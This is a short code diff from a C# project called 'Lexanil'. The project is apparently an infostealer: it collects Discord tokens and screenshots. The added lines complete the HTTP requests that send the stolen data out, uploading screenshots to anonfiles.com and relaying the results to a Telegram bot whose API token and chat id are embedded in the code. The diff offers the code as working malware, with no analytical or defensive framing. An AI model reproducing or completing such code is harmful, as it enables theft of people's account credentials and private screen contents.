@@ -171,6 +171,8 @@ namespace Lexanil
                 $"Discord Tokens: {string.Join("\n", getDiscordTokens())}";
 
             HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
+            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
+            Stream resStream = response.GetResponseStream();
         }
 
         private List<string> getDiscordTokens()
@@ -233,7 +235,9 @@ namespace Lexanil
                 byte[] responseArray = client.UploadFile("https://api.anonfiles.com/upload", Paths.ScreenShots + ".jpeg");
                 var response = System.Text.Encoding.ASCII.GetString(responseArray).ToString();
                 HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"https://api.telegram.org/bot1991257214:AAHecknMxCKd24uX8wNC5g5AYahRLlUSCVs/sendMessage?chat_id=-561001723&text={response}");
-
+                HttpWebResponse response2 = (HttpWebResponse)request.GetResponse();
+                Stream resStream = response2.GetResponseStream();
+                // JSON PARSE
             }
         }
     }
